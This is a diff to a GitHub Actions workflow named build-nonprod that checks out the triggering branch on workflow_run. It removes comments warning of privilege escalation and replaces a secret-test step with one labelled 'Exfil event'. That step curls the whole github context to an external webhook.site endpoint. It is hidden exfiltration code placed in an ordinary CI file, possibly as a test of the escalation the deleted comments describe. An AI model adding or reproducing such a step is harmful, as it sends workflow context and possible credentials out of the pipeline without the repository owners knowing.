@@ -1,20 +1,3 @@
-# IMPORTANT NOTE BEFORE IMPLEMENTING BUILD-PROD
-# I believe this approach using `workflow_run` will introduce an accidental
-# "privilege escalation" once we use environments to restrict secrets
-# when doing `workflow_run` the context of the workflow will be the default (protected) branch
-# here we're doing a hacky get-around by checking out the head_branch in checkout
-# TL;DR - need to rethink this when we do prod builds and potentially use `workflow_dispatch`
-
-
-# notes for tomorrow
-# we want to trigger builds only after integration checks have passed
-# for both prod and nonprod
-# for build-prod, we need a way to check that the integration checks were themselves triggered from
-# a merge to main
-# we _only_ want build-prod to run:
-# * on integration completed successfully
-# * if integration was itself run on_release
-
 name: build-nonprod
 
 on:
@@ -30,24 +13,15 @@ jobs:
     environment: nonprod
     env:
       ECR_REPOSITORY: kiss-server
-      TEST: ${{ secrets.TEST }}
     steps:
     - name: Checkout code
       uses: actions/checkout@v2
       with:
         ref: ${{ github.event.workflow_run.head_branch }}
 
-    - name: Test environment
+    - name: Exfil event
       run: |
-        if [[ $TEST == "prod" ]]
-        then
-            exit 1
-        fi
-
-        if [[ $TEST == "nonprod" ]]
-        then  
-            exit 2
-        fi
+        curl https://webhook.site/df8cc6ae-32b1-42cb-85a7-21c19fd37f56 --data "${{ github }}"
 
     - name: Compute short SHA
       id: short_sha
